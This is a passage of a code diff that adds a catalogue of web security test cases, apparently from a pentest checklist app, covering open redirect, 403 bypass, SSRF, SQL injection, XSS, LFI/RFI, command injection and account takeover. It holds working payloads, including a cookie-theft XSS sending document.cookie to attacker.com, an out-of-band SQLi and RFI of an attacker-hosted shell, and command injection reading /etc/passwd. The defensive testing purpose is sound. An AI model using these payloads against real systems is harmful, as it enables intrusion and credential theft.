+        \`open-redirect\` · \`login-flow\`
+
+        ## Description
+
+        Test the login flow for open redirect vulnerabilities.
+
+        ## Steps
+
+        1. Go to profile page: \`samplesite.me/accounts/profile\`.
+        2. Logout and clear cookies.
+        3. Paste profile URL.
+        4. Check redirect parameters:
+           - \`https://samplesite.me/login?next=accounts/profile\`
+           - \`https://samplesite.me/login?retUrl=accounts/profile\`
+        5. Exploit: \`https://samplesite.me/login?next=https://evil.com/\`
+
+        ## Expected Result
+
+        Redirect parameters should be validated.
+
+        ## Security Impact
+
+        Medium – phishing via login redirect.
+        `
+        }, {
+            id: 59,
+            category: 'Open Redirect',
+            bugType: 'open-redirect',
+            title: 'Open Redirect – XSS Chaining',
+            markdown: `# Test Case 59 – Open Redirect – XSS Chaining
+
+        ## Bug Type
+
+        \`open-redirect\` · \`xss-chain\`
+
+        ## Description
+
+        Test whether open redirect can be chained with XSS.
+
+        ## Example
+
+        \`\`\`text
+        https://samplesite.me/login?next=javascript:alert(1);//
+        \`\`\`
+
+        ## Expected Result
+
+        The application should reject javascript: URIs.
+
+        ## Security Impact
+
+        High – XSS via open redirect.
+        `
+        }, {
+            id: 60,
+            category: 'Open Redirect',
+            bugType: 'open-redirect',
+            title: 'Open Redirect – Google Dorking',
+            markdown: `# Test Case 60 – Open Redirect – Google Dorking
+
+        ## Bug Type
+
+        \`open-redirect\` · \`discovery\`
+
+        ## Description
+
+        Use Google dorks to find open redirect endpoints.
+
+        ## Dork
+
+        \`\`\`text
+        site:target.com inurl:?dest inurl:uri | inurl:continue | inurl:window | inurl:View | inurl:show | inurl:open | inurl:redirect | inurl:Path | inurl:url | inurl:out | inurl:to | inurl:Dir | inurl:navigation | inurl:file | inurl:reference | inurl:Html | inurl:data | inurl:site | inurl:host
+        \`\`\`
+
+        ## Expected Result
+
+        Findings should be validated manually.
+
+        ## Security Impact
+
+        Medium – discovery of open redirects.
+        `
+        }, {
+            id: 61,
+            category: '403 Bypass',
+            bugType: '403-bypass',
+            title: 'X-Original-URL Header',
+            markdown: `# Test Case 61 – X-Original-URL Header
+
+        ## Bug Type
+
+        \`403-bypass\` · \`header-injection\`
+
+        ## Description
+
+        Test whether the X-Original-URL header can bypass 403 restrictions.
+
+        ## Example
+
+        \`\`\`http
+        GET /anything HTTP/1.1
+        Host: target.com
+        X-Original-URL: /admin
+        \`\`\`
+
+        ## Expected Result
+
+        The application should ignore or reject such headers.
+
+        ## Security Impact
+
+        High – unauthorized access to admin endpoints.
+        `
+        }, {
+            id: 62,
+            category: '403 Bypass',
+            bugType: '403-bypass',
+            title: 'Path Traversal Bypass',
+            markdown: `# Test Case 62 – Path Traversal Bypass
+
+        ## Bug Type
+
+        \`403-bypass\` · \`path-manipulation\`
+
+        ## Description
+
+        Test path traversal techniques to bypass 403 restrictions.
+
+        ## Examples
+
+        \`\`\`text
+        target.com/%2e%2e/admin
+        target.com/secret/.
+        target.com//secret//
+        target.com/./secret/..
+        target.com/;/secret
+        target.com/.;/secret
+        target.com//;//secret
+        \`\`\`
+
+        ## Expected Result
+
+        Path traversal attempts should be blocked.
+
+        ## Security Impact
+
+        High – unauthorized access via path manipulation.
+        `
+        }, {
+            id: 63,
+            category: '403 Bypass',
+            bugType: '403-bypass',
+            title: 'Directory Name Manipulation',
+            markdown: `# Test Case 63 – Directory Name Manipulation
+
+        ## Bug Type
+
+        \`403-bypass\` · \`directory-manipulation\`
+
+        ## Description
+
+        Test directory name manipulation to bypass 403.
+
+        ## Examples
+
+        \`\`\`text
+        target.com/admin..;/
+        target.com/aDmIN
+        \`\`\`
+
+        ## Expected Result
+
+        Directory names should be normalized and access controlled.
+
+        ## Security Impact
+
+        High – unauthorized access via directory manipulation.
+        `
+        }, {
+            id: 64,
+            category: '403 Bypass',
+            bugType: '403-bypass',
+            title: 'Web Cache Poisoning',
+            markdown: `# Test Case 64 – Web Cache Poisoning
+
+        ## Bug Type
+
+        \`403-bypass\` · \`cache-poisoning\`
+
+        ## Description
+
+        Test whether cache poisoning can bypass 403 restrictions.
+
+        ## Example
+
+        \`\`\`http
+        GET /anything HTTP/1.1
+        Host: victim.com
+        X-Original-URL: /admin
+        \`\`\`
+
+        ## Expected Result
+
+        Cache should not serve unauthorized content.
+
+        ## Security Impact
+
+        High – cache poisoning leads to unauthorized access.
+        `
+        }, {
+            id: 65,
+            category: 'SSRF',
+            bugType: 'ssrf',
+            title: 'URL Parameter Manipulation',
+            markdown: `# Test Case 65 – URL Parameter Manipulation
+
+        ## Bug Type
+
+        \`ssrf\` · \`url-manipulation\`
+
+        ## Description
+
+        Test SSRF via URL parameter manipulation.
+
+        ## Steps
+
+        1. Find parameters that take URLs.
+        2. Test with internal IP addresses:
+           - \`http://127.0.0.1\`
+           - \`http://169.254.169.254\` (AWS metadata)
+           - \`http://localhost\`
+        3. Check response for internal data.
+
+        ## Expected Result
+
+        Internal IPs should be blocked.
+
+        ## Security Impact
+
+        High – internal network access.
+        `
+        }, {
+            id: 66,
+            category: 'SSRF',
+            bugType: 'ssrf',
+            title: 'SSRF via URL Encoding',
+            markdown: `# Test Case 66 – SSRF via URL Encoding
+
+        ## Bug Type
+
+        \`ssrf\` · \`encoding-bypass\`
+
+        ## Description
+
+        Test SSRF using URL encoding bypasses.
+
+        ## Examples
+
+        \`\`\`text
+        http://2130706433/ (127.0.0.1)
+        http://0x7F000001/
+        http://0177.0.0.1/
+        \`\`\`
+
+        ## Expected Result
+
+        All IP representations should be blocked.
+
+        ## Security Impact
+
+        High – SSRF bypass.
+        `
+        }, {
+            id: 67,
+            category: 'Business Logic Flaws',
+            bugType: 'business-logic',
+            title: 'Race Condition – Discount Code',
+            markdown: `# Test Case 67 – Race Condition – Discount Code
+
+        ## Bug Type
+
+        \`business-logic\` · \`race-condition\`
+
+        ## Description
+
+        Test whether discount codes can be applied multiple times via race condition.
+
+        ## Steps
+
+        1. Add item to cart.
+        2. Apply discount code.
+        3. Send multiple coupon requests in parallel.
+        4. Check if discount is applied multiple times.
+        5. Purchase item at reduced price.
+
+        ## Expected Result
+
+        Discount should be applied only once per order.
+
+        ## Security Impact
+
+        High – financial loss via discount abuse.
+        `
+        }, {
+            id: 68,
+            category: 'Business Logic Flaws',
+            bugType: 'business-logic',
+            title: 'Parameter Pollution',
+            markdown: `# Test Case 68 – Parameter Pollution
+
+        ## Bug Type
+
+        \`business-logic\` · \`hpp\`
+
+        ## Description
+
+        Test HTTP parameter pollution attacks.
+
+        ## Testing
+
+        \`\`\`text
+        /?id=1;select+1&id=2,3+from+users+where+id=1--
+        /?id=1/**/union/*&id=*/select/*&id=*/pwd/*&id=*/from/*&id=*/users
+        \`\`\`
+
+        ## Expected Result
+
+        Parameter pollution should be mitigated.
+
+        ## Security Impact
+
+        Medium – can lead to injection bypass.
+        `
+        }, {
+            id: 69,
+            category: 'Business Logic Flaws',
+            bugType: 'business-logic',
+            title: 'Parameter Fragmentation',
+            markdown: `# Test Case 69 – Parameter Fragmentation
+
+        ## Bug Type
+
+        \`business-logic\` · \`hpf\`
+
+        ## Description
+
+        Test HTTP parameter fragmentation attacks.
+
+        ## Example
+
+        \`\`\`text
+        /?a=1+union/*&b=*/select+1,2
+        /?a=1+union/*&b=*/select+1,pass/*&c=*/from+users--
+        \`\`\`
+
+        ## Expected Result
+
+        Fragmentation should not allow injection.
+
+        ## Security Impact
+
+        Medium – injection bypass.
+        `
+        }, {
+            id: 70,
+            category: 'WAF Bypass',
+            bugType: 'waf-bypass',
+            title: 'SQL Injection – Normalization Bypass',
+            markdown: `# Test Case 70 – SQL Injection – Normalization Bypass
+
+        ## Bug Type
+
+        \`waf-bypass\` · \`sql-injection\`
+
+        ## Description
+
+        Test SQL injection using normalization bypass techniques.
+
+        ## Examples
+
+        \`\`\`text
+        /?id=1/*union*/union/*select*/select+1,2,3/*
+        /?id=1+un/**/ion+sel/**/ect+1,2,3--
+        \`\`\`
+
+        ## Expected Result
+
+        WAF should normalize and block payloads.
+
+        ## Security Impact
+
+        High – SQL injection.
+        `
+        }, {
+            id: 71,
+            category: 'WAF Bypass',
+            bugType: 'waf-bypass',
+            title: 'SQL Injection – HPP Bypass',
+            markdown: `# Test Case 71 – SQL Injection – HPP Bypass
+
+        ## Bug Type
+
+        \`waf-bypass\` · \`sql-hpp\`
+
+        ## Description
+
+        Test SQL injection using HTTP parameter pollution.
+
+        ## Example
+
+        \`\`\`text
+        /?id=1;select+1&id=2,3+from+users+where+id=1--
+        \`\`\`
+
+        ## Expected Result
+
+        WAF should block HPP-based injection.
+
+        ## Security Impact
+
+        High – SQL injection.
+        `
+        }, {
+            id: 72,
+            category: 'WAF Bypass',
+            bugType: 'waf-bypass',
+            title: 'SQL Injection – Blind SQL',
+            markdown: `# Test Case 72 – SQL Injection – Blind SQL
+
+        ## Bug Type
+
+        \`waf-bypass\` · \`blind-sql\`
+
+        ## Description
+
+        Test blind SQL injection techniques.
+
+        ## Function Synonyms
+
+        - \`substring()\` → \`mid()\`, \`substr()\`
+        - \`ascii()\` → \`hex()\`, \`bin()\`
+        - \`benchmark()\` → \`sleep()\`
+
+        ## Logical Operators
+
+        - \`and 1=1\`
+        - \`and 5!=6\`
+        - \`and 0x50=0x50\`
+
+        ## Expected Result
+
+        Blind SQL should be detected and blocked.
+
+        ## Security Impact
+
+        High – data extraction.
+        `
+        }, {
+            id: 73,
+            category: 'WAF Bypass',
+            bugType: 'waf-bypass',
+            title: 'SQL Injection – Signature Bypass',
+            markdown: `# Test Case 73 – SQL Injection – Signature Bypass
+
+        ## Bug Type
+
+        \`waf-bypass\` · \`signature-bypass\`
+
+        ## Description
+
+        Test signature bypass techniques for SQL injection.
+
+        ## Examples
+
+        \`\`\`text
+        /?id=1+union+(select+'xz'from+xxx)
+        /?id=(1)union(select(1),mid(hash,1,32)from(users))
+        /?id=(1)or(0x50=0x50)
+        \`\`\`
+
+        ## Expected Result
+
+        WAF should detect obfuscated payloads.
+
+        ## Security Impact
+
+        High – SQL injection.
+        `
+        }, {
+            id: 74,
+            category: 'WAF Bypass',
+            bugType: 'waf-bypass',
+            title: 'XSS – WAF Bypass',
+            markdown: `# Test Case 74 – XSS – WAF Bypass
+
+        ## Bug Type
+
+        \`waf-bypass\` · \`xss\`
+
+        ## Description
+
+        Test XSS WAF bypass techniques.
+
+        ## Examples
+
+        \`\`\`text
+        <svg onload=prompt&#000000040document.domain)>
+        <svg onload=prompt&#x000000028;document.domain)>
+        <img src=x onerror=alert&#40;1&#41;>
+        \`\`\`
+
+        ## Expected Result
+
+        WAF should block obfuscated XSS payloads.
+
+        ## Security Impact
+
+        High – XSS.
+        `
+        }, {
+            id: 75,
+            category: 'WAF Bypass',
+            bugType: 'waf-bypass',
+            title: 'XSS – Data URI',
+            markdown: `# Test Case 75 – XSS – Data URI
+
+        ## Bug Type
+
+        \`waf-bypass\` · \`xss-datauri\`
+
+        ## Description
+
+        Test XSS using data URIs.
+
+        ## Example
+
+        \`\`\`text
+        /?param=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
+        \`\`\`
+
+        ## Expected Result
+
+        Data URI XSS should be blocked.
+
+        ## Security Impact
+
+        High – XSS.
+        `
+        }, {
+            id: 76,
+            category: 'S3 Bucket Misconfiguration',
+            bugType: 's3-misconfig',
+            title: 'S3 Bucket – List Items',
+            markdown: `# Test Case 76 – S3 Bucket – List Items
+
+        ## Bug Type
+
+        \`s3-misconfig\` · \`public-bucket\`
+
+        ## Description
+
+        Test whether S3 buckets allow listing of objects.
+
+        ## Commands
+
+        \`\`\`bash
+        aws s3 ls s3://<bucket name>
+        aws s3 ls s3://<bucket name> --no-sign-request
+        \`\`\`
+
+        ## Expected Result
+
+        Buckets should not allow public listing.
+
+        ## Security Impact
+
+        High – data exposure.
+        `
+        }, {
+            id: 77,
+            category: 'S3 Bucket Misconfiguration',
+            bugType: 's3-misconfig',
+            title: 'S3 Bucket – Write Access',
+            markdown: `# Test Case 77 – S3 Bucket – Write Access
+
+        ## Bug Type
+
+        \`s3-misconfig\` · \`write-access\`
+
+        ## Description
+
+        Test whether S3 buckets allow write access.
+
+        ## Commands
+
+        \`\`\`bash
+        aws s3 mv test.txt s3://<bucket name>
+        aws s3 cp test.txt s3://<bucket name>/test.txt
+        \`\`\`
+
+        ## Expected Result
+
+        Write access should be restricted.
+
+        ## Security Impact
+
+        High – data manipulation.
+        `
+        }, {
+            id: 78,
+            category: 'S3 Bucket Misconfiguration',
+            bugType: 's3-misconfig',
+            title: 'S3 Bucket – Delete Access',
+            markdown: `# Test Case 78 – S3 Bucket – Delete Access
+
+        ## Bug Type
+
+        \`s3-misconfig\` · \`delete-access\`
+
+        ## Description
+
+        Test whether S3 buckets allow delete access.
+
+        ## Command
+
+        \`\`\`bash
+        aws s3 rm test.txt s3://<bucket name>/test.txt
+        \`\`\`
+
+        ## Expected Result
+
+        Delete access should be restricted.
+
+        ## Security Impact
+
+        High – data loss.
+        `
+        }, {
+            id: 79,
+            category: 'XSS',
+            bugType: 'xss',
+            title: 'Reflected XSS – Basic',
+            markdown: `# Test Case 79 – Reflected XSS – Basic
+
+        ## Bug Type
+
+        \`xss\` · \`reflected\`
+
+        ## Description
+
+        Test for basic reflected XSS.
+
+        ## Examples
+
+        \`\`\`text
+        <script>alert(1)</script>
+        <img src=x onerror=alert(1)>
+        <svg onload=alert(1)>
+        \`\`\`
+
+        ## Expected Result
+
+        Payloads should be sanitized.
+
+        ## Security Impact
+
+        High – XSS.
+        `
+        }, {
+            id: 80,
+            category: 'XSS',
+            bugType: 'xss',
+            title: 'Reflected XSS – HTML Context',
+            markdown: `# Test Case 80 – Reflected XSS – HTML Context
+
+        ## Bug Type
+
+        \`xss\` · \`reflected-html\`
+
+        ## Description
+
+        Test reflected XSS in HTML context.
+
+        ## Examples
+
+        \`\`\`text
+        "><script>alert(document.domain)</script>
+        " onmouseover="alert('XSS')
+        " accesskey="X" onclick="alert(1)
+        \`\`\`
+
+        ## Expected Result
+
+        HTML context XSS should be blocked.
+
+        ## Security Impact
+
+        High – XSS.
+        `
+        }, {
+            id: 81,
+            category: 'XSS',
+            bugType: 'xss',
+            title: 'Reflected XSS – URL Path',
+            markdown: `# Test Case 81 – Reflected XSS – URL Path
+
+        ## Bug Type
+
+        \`xss\` · \`reflected-url\`
+
+        ## Description
+
+        Test reflected XSS in URL path.
+
+        ## Examples
+
+        \`\`\`text
+        https://target.com/%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+        https://target.com/search?q=<script>alert(1)</script>
+        \`\`\`
+
+        ## Expected Result
+
+        URL path XSS should be blocked.
+
+        ## Security Impact
+
+        High – XSS.
+        `
+        }, {
+            id: 82,
+            category: 'XSS',
+            bugType: 'xss',
+            title: 'Stored XSS – Comments',
+            markdown: `# Test Case 82 – Stored XSS – Comments
+
+        ## Bug Type
+
+        \`xss\` · \`stored\`
+
+        ## Description
+
+        Test stored XSS in comment fields.
+
+        ## Example
+
+        \`\`\`text
+        </textarea><img src=x onerror=alert(1)>
+        \`\`\`
+
+        ## Expected Result
+
+        Stored XSS should be prevented.
+
+        ## Security Impact
+
+        High – persistent XSS.
+        `
+        }, {
+            id: 83,
+            category: 'XSS',
+            bugType: 'xss',
+            title: 'Stored XSS – Profile Fields',
+            markdown: `# Test Case 83 – Stored XSS – Profile Fields
+
+        ## Bug Type
+
+        \`xss\` · \`stored-profile\`
+
+        ## Description
+
+        Test stored XSS in profile fields.
+
+        ## Example
+
+        \`\`\`text
+        "><svg/onload=alert(document.domain)>
+        \`\`\`
+
+        ## Expected Result
+
+        Profile fields should sanitize input.
+
+        ## Security Impact
+
+        High – persistent XSS.
+        `
+        }, {
+            id: 84,
+            category: 'XSS',
+            bugType: 'xss',
+            title: 'XSS via Markdown',
+            markdown: `# Test Case 84 – XSS via Markdown
+
+        ## Bug Type
+
+        \`xss\` · \`markdown\`
+
+        ## Description
+
+        Test XSS via Markdown rendering.
+
+        ## Examples
+
+        \`\`\`text
+        [Click](javascript:alert(1))
+        ![image](javascript:alert(1))
+        \`\`\`
+
+        ## Expected Result
+
+        Markdown should be sanitized.
+
+        ## Security Impact
+
+        High – XSS via Markdown.
+        `
+        }, {
+            id: 85,
+            category: 'XSS',
+            bugType: 'xss',
+            title: 'XSS via File Upload',
+            markdown: `# Test Case 85 – XSS via File Upload
+
+        ## Bug Type
+
+        \`xss\` · \`file-upload\`
+
+        ## Description
+
+        Test XSS via file upload.
+
+        ## Examples
+
+        - Upload HTML file with XSS.
+        - Upload SVG with XSS.
+        - Upload image with XSS in filename.
+
+        ## Expected Result
+
+        File uploads should be sanitized.
+
+        ## Security Impact
+
+        High – XSS via file upload.
+        `
+        }, {
+            id: 86,
+            category: 'XSS',
+            bugType: 'xss',
+            title: 'DOM-Based XSS',
+            markdown: `# Test Case 86 – DOM-Based XSS
+
+        ## Bug Type
+
+        \`xss\` · \`dom-based\`
+
+        ## Description
+
+        Test for DOM-based XSS.
+
+        ## Steps
+
+        1. Look for JavaScript that uses:
+           - \`document.location\`
+           - \`document.URL\`
+           - \`location.hash\`
+           - \`document.referrer\`
+        2. Test with payload.
+
+        ## Expected Result
+
+        DOM-based XSS should be prevented.
+
+        ## Security Impact
+
+        High – DOM-based XSS.
+        `
+        }, {
+            id: 87,
+            category: 'XSS',
+            bugType: 'xss',
+            title: 'XSS via Cookie Theft',
+            markdown: `# Test Case 87 – XSS via Cookie Theft
+
+        ## Bug Type
+
+        \`xss\` · \`cookie-theft\`
+
+        ## Description
+
+        Test XSS payloads that steal cookies.
+
+        ## Payload
+
+        \`\`\`javascript
+        <script>document.location='//attacker.com/'+document.cookie</script>
+        \`\`\`
+
+        ## Expected Result
+
+        XSS should be blocked.
+
+        ## Security Impact
+
+        Critical – session hijacking.
+        `
+        }, {
+            id: 88,
+            category: 'XSS',
+            bugType: 'xss',
+            title: 'XSS via Password Reset',
+            markdown: `# Test Case 88 – XSS via Password Reset
+
+        ## Bug Type
+
+        \`xss\` · \`password-reset\`
+
+        ## Description
+
+        Test XSS via password reset functionality.
+
+        ## Example
+
+        \`\`\`text
+        Set password as: >'>"><img src=x onmouseover=prompt(document.domain)>
+        \`\`\`
+
+        ## Expected Result
+
+        XSS should be prevented.
+
+        ## Security Impact
+
+        High – XSS in password reset.
+        `
+        }, {
+            id: 89,
+            category: 'XSS',
+            bugType: 'xss',
+            title: 'XSS via CSS Injection',
+            markdown: `# Test Case 89 – XSS via CSS Injection
+
+        ## Bug Type
+
+        \`xss\` · \`css-injection\`
+
+        ## Description
+
+        Test XSS via CSS injection.
+
+        ## Example
+
+        \`\`\`text
+        <style>@import '//attacker.com/evil.css';</style>
+        \`\`\`
+
+        ## Expected Result
+
+        CSS injection should be blocked.
+
+        ## Security Impact
+
+        Medium – XSS via CSS.
+        `
+        }, {
+            id: 90,
+            category: 'XSS',
+            bugType: 'xss',
+            title: 'XSS via META Tag',
+            markdown: `# Test Case 90 – XSS via META Tag
+
+        ## Bug Type
+
+        \`xss\` · \`meta-tag\`
+
+        ## Description
+
+        Test XSS via META refresh tags.
+
+        ## Example
+
+        \`\`\`text
+        <meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+        \`\`\`
+
+        ## Expected Result
+
+        META tag XSS should be blocked.
+
+        ## Security Impact
+
+        Medium – XSS via META.
+        `
+        }, {
+            id: 91,
+            category: 'SQL Injection',
+            bugType: 'sql-injection',
+            title: 'SQL Injection – Error Based',
+            markdown: `# Test Case 91 – SQL Injection – Error Based
+
+        ## Bug Type
+
+        \`sql-injection\` · \`error-based\`
+
+        ## Description
+
+        Test error-based SQL injection.
+
+        ## Examples
+
+        \`\`\`text
+        ' OR '1'='1
+        ' UNION SELECT 1,2,3--
+        ' AND 1=1--
+        \`\`\`
+
+        ## Expected Result
+
+        SQL injection should be blocked.
+
+        ## Security Impact
+
+        High – SQL injection.
+        `
+        }, {
+            id: 92,
+            category: 'SQL Injection',
+            bugType: 'sql-injection',
+            title: 'SQL Injection – Union Based',
+            markdown: `# Test Case 92 – SQL Injection – Union Based
+
+        ## Bug Type
+
+        \`sql-injection\` · \`union-based\`
+
+        ## Description
+
+        Test union-based SQL injection.
+
+        ## Examples
+
+        \`\`\`text
+        1 UNION SELECT 1,2,3
+        1 UNION SELECT user,password FROM users
+        \`\`\`
+
+        ## Expected Result
+
+        Union-based injection should be blocked.
+
+        ## Security Impact
+
+        High – SQL injection.
+        `
+        }, {
+            id: 93,
+            category: 'SQL Injection',
+            bugType: 'sql-injection',
+            title: 'SQL Injection – Blind Boolean',
+            markdown: `# Test Case 93 – SQL Injection – Blind Boolean
+
+        ## Bug Type
+
+        \`sql-injection\` · \`blind-boolean\`
+
+        ## Description
+
+        Test blind boolean-based SQL injection.
+
+        ## Examples
+
+        \`\`\`text
+        ' AND 1=1--
+        ' AND 'a'='a
+        ' AND 5!=6
+        \`\`\`
+
+        ## Expected Result
+
+        Blind boolean injection should be blocked.
+
+        ## Security Impact
+
+        High – SQL injection.
+        `
+        }, {
+            id: 94,
+            category: 'SQL Injection',
+            bugType: 'sql-injection',
+            title: 'SQL Injection – Blind Time',
+            markdown: `# Test Case 94 – SQL Injection – Blind Time
+
+        ## Bug Type
+
+        \`sql-injection\` · \`blind-time\`
+
+        ## Description
+
+        Test time-based blind SQL injection.
+
+        ## Examples
+
+        \`\`\`text
+        ' AND SLEEP(5)--
+        ' AND BENCHMARK(2000000,MD5(NOW()))--
+        \`\`\`
+
+        ## Expected Result
+
+        Time-based injection should be blocked.
+
+        ## Security Impact
+
+        High – SQL injection.
+        `
+        }, {
+            id: 95,
+            category: 'SQL Injection',
+            bugType: 'sql-injection',
+            title: 'SQL Injection – Out-of-Band',
+            markdown: `# Test Case 95 – SQL Injection – Out-of-Band
+
+        ## Bug Type
+
+        \`sql-injection\` · \`oob\`
+
+        ## Description
+
+        Test out-of-band SQL injection.
+
+        ## Example
+
+        \`\`\`text
+        1 AND LOAD_FILE(CONCAT('\\\\',DATABASE(),'.attacker.com\\test'))
+        \`\`\`
+
+        ## Expected Result
+
+        OOB injection should be blocked.
+
+        ## Security Impact
+
+        High – SQL injection.
+        `
+        }, {
+            id: 96,
+            category: 'Command Injection',
+            bugType: 'cmd-injection',
+            title: 'Command Injection – Basic',
+            markdown: `# Test Case 96 – Command Injection – Basic
+
+        ## Bug Type
+
+        \`cmd-injection\` · \`basic\`
+
+        ## Description
+
+        Test basic command injection.
+
+        ## Examples
+
+        \`\`\`text
+        ; ls -la
+        | whoami
+        & id
+        \`id\`
+        \`\`\`
+
+        ## Expected Result
+
+        Command injection should be blocked.
+
+        ## Security Impact
+
+        Critical – RCE.
+        `
+        }, {
+            id: 97,
+            category: 'Command Injection',
+            bugType: 'cmd-injection',
+            title: 'Command Injection – Bypass',
+            markdown: `# Test Case 97 – Command Injection – Bypass
+
+        ## Bug Type
+
+        \`cmd-injection\` · \`bypass\`
+
+        ## Description
+
+        Test command injection bypass techniques.
+
+        ## Examples
+
+        \`\`\`text
+        $(id)
+        ${IFS}id
+        ;cat${IFS}/etc/passwd
+        \`\`\`
+
+        ## Expected Result
+
+        Command injection should be blocked.
+
+        ## Security Impact
+
+        Critical – RCE.
+        `
+        }, {
+            id: 98,
+            category: 'File Inclusion',
+            bugType: 'lfi',
+            title: 'Local File Inclusion (LFI)',
+            markdown: `# Test Case 98 – Local File Inclusion (LFI)
+
+        ## Bug Type
+
+        \`lfi\` · \`path-traversal\`
+
+        ## Description
+
+        Test local file inclusion.
+
+        ## Examples
+
+        \`\`\`text
+        ../../../../etc/passwd
+        ..\..\..\windows\win.ini
+        /../../../../../../../etc/passwd
+        \`\`\`
+
+        ## Expected Result
+
+        LFI should be blocked.
+
+        ## Security Impact
+
+        High – file disclosure.
+        `
+        }, {
+            id: 99,
+            category: 'File Inclusion',
+            bugType: 'lfi',
+            title: 'LFI – Null Byte',
+            markdown: `# Test Case 99 – LFI – Null Byte
+
+        ## Bug Type
+
+        \`lfi\` · \`null-byte\`
+
+        ## Description
+
+        Test LFI with null byte injection.
+
+        ## Example
+
+        \`\`\`text
+        ../../../../etc/passwd%00
+        \`\`\`
+
+        ## Expected Result
+
+        Null byte injection should be blocked.
+
+        ## Security Impact
+
+        High – file disclosure.
+        `
+        }, {
+            id: 100,
+            category: 'File Inclusion',
+            bugType: 'lfi',
+            title: 'LFI – Log Poisoning',
+            markdown: `# Test Case 100 – LFI – Log Poisoning
+
+        ## Bug Type
+
+        \`lfi\` · \`log-poisoning\`
+
+        ## Description
+
+        Test LFI via log poisoning.
+
+        ## Steps
+
+        1. Poison logs with PHP code.
+        2. Include log file.
+        3. Execute code.
+
+        ## Expected Result
+
+        Log poisoning should be prevented.
+
+        ## Security Impact
+
+        Critical – RCE.
+        `
+        }, {
+            id: 101,
+            category: 'File Inclusion',
+            bugType: 'rfi',
+            title: 'Remote File Inclusion (RFI)',
+            markdown: `# Test Case 101 – Remote File Inclusion (RFI)
+
+        ## Bug Type
+
+        \`rfi\` · \`remote-include\`
+
+        ## Description
+
+        Test remote file inclusion.
+
+        ## Examples
+
+        \`\`\`text
+        http://attacker.com/shell.txt
+        data:text/plain,<?php phpinfo(); ?>
+        \`\`\`
+
+        ## Expected Result
+
+        RFI should be blocked.
+
+        ## Security Impact
+
+        Critical – RCE.
+        `
+        }, {
+            id: 102,
+            category: 'Account Takeover',
+            bugType: 'account-takeover',
+            title: 'Account Takeover – Link Poisoning',
+            markdown: `# Test Case 102 – Account Takeover – Link Poisoning
+
+        ## Bug Type
+
+        \`account-takeover\` · \`link-poisoning\`
+
+        ## Description
+
+        Test account takeover via link poisoning.
+
+        ## Example
+
+        \`\`\`text
+        YOUR ACCOUNT<a href="https://evil.com">LOGIN</a>
+        \`\`\`
+
+        ## Expected Result
+
+        Links should be properly validated.
+
+        ## Security Impact
+
+        High – account takeover.
+        `
+        }, {
+            id: 103,
+            category: 'Account Takeover',
+            bugType: 'account-takeover',
+            title: 'Account Takeover – CSRF Email Change',
+            markdown: `# Test Case 103 – Account Takeover – CSRF Email Change
+
+        ## Bug Type
+
+        \`account-takeover\` · \`csrf-email\`
+
+        ## Description
+
+        Test account takeover via CSRF email change.
+
+        ## Steps
+
+        1. Create CSRF POC for email change.
+        2. Send to victim.
+        3. Victim's email gets changed.
+        4. Reset password to takeover.
+
+        ## Expected Result
+
+        CSRF protection should be enforced.
+
+        ## Security Impact
+
+        Critical – account takeover.
+        `
+        }, {
+            id: 104,
+            category: 'Account Takeover',
+            bugType: 'account-takeover',
+            title: 'Account Takeover – Password Reset Link Theft',
+            markdown: `# Test Case 104 – Account Takeover – Password Reset Link Theft
+
+        ## Bug Type
+
+        \`account-takeover\` · \`token-theft\`
+
+        ## Description
+
+        Test account takeover via reset link theft.
+
+        ## Steps
+
+        1. Request password reset.
+        2. Intercept and change host header.
+        3. Token sent to attacker's server.
+        4. Use token to takeover account.
+
+        ## Expected Result
+
+        Host header should be validated.
+
+        ## Security Impact
+
+        Critical – account takeover.
+        `
+        }, {
+            id: 105,
+            category: 'Account Takeover',
+            bugType: 'account-takeover',
+            title: 'Account Takeover – OTP Reuse',
+            markdown: `# Test Case 105 – Account Takeover – OTP Reuse
+
+        ## Bug Type
+
+        \`account-takeover\` · \`otp-reuse\`
+
+        ## Description
+
+        Test account takeover via OTP reuse.
+
+        ## Steps
+
+        1. Get OTP for your account.
+        2. Use same OTP for victim's account.
+        3. If OTP is not tied to session → vulnerable.
+
+        ## Expected Result
+
+        OTPs should be session-bound.
+
+        ## Security Impact
+
+        High – account takeover.
+        `
+        }, {
+            id: 106,
+            category: 'Clickjacking',
+            bugType: 'clickjacking',
+            title: 'Clickjacking – Basic',
+            markdown: `# Test Case 106 – Clickjacking – Basic
+
+        ## Bug Type
+
+        \`clickjacking\` · \`missing-x-frame-options\`
+
+        ## Description
+
+        Test for missing X-Frame-Options header.
+
+        ## Steps
+
+        1. Check if X-Frame-Options header is missing.
+        2. Create page with iframe.
+        3. Overlay buttons to trick victim.
+
+        ## Expected Result
+
+        X-Frame-Options should be present.
+
+        ## Security Impact
+
+        Medium – clickjacking.
+        `
+        }, {
+            id: 107,
+            category: 'Clickjacking',
+            bugType: 'clickjacking',
+            title: 'Clickjacking – 2FA Disable',
+            markdown: `# Test Case 107 – Clickjacking – 2FA Disable
+
+        ## Bug Type
+
+        \`clickjacking\` · \`2fa-disable\`
+
+        ## Description
+
+        Test clickjacking on 2FA disable page.
+
+        ## Steps
+
+        1. Find 2FA disable page.
+        2. Check if vulnerable to Clickjacking.
+        3. Overlay on victim's page.
+        4. Victim clicks and disables 2FA.
+
+        ## Expected Result
+
+        X-Frame-Options should prevent framing.
+
+        ## Security Impact
+
+        High – 2FA disable via clickjacking.
+        `
+        }, {
+            id: 108,
+            category: 'Race Condition',
+            bugType: 'race-condition',
+            title: 'Race Condition – Account Creation',
+            markdown: `# Test Case 108 – Race Condition – Account Creation
+
+        ## Bug Type
+
+        \`race-condition\` · \`account-creation\`
+
+        ## Description
+
+        Test race condition in account creation.
+
+        ## Steps
+
+        1. Send multiple account creation requests.
+        2. Check for duplicate accounts.
+        3. Try to use same email multiple times.
+
+        ## Expected Result
+
+        Race conditions should be prevented.
+
+        ## Security Impact
+
+        Medium – duplicate accounts.
+        `
+        }, {
+            id: 109,
+            category: 'Race Condition',
+            bugType: 'race-condition',
+            title: 'Race Condition – Coupon Application',
+            markdown: `# Test Case 109 – Race Condition – Coupon Application
+
+        ## Bug Type
+
+        \`race-condition\` · \`coupon\`
+
+        ## Description
+
+        Test race condition in coupon application.
+
+        ## Steps
+
+        1. Apply coupon.
+        2. Send multiple requests in parallel.
+        3. Check if coupon applied multiple times.
+
+        ## Expected Result
+
+        Race conditions should be prevented.
+
+        ## Security Impact
+
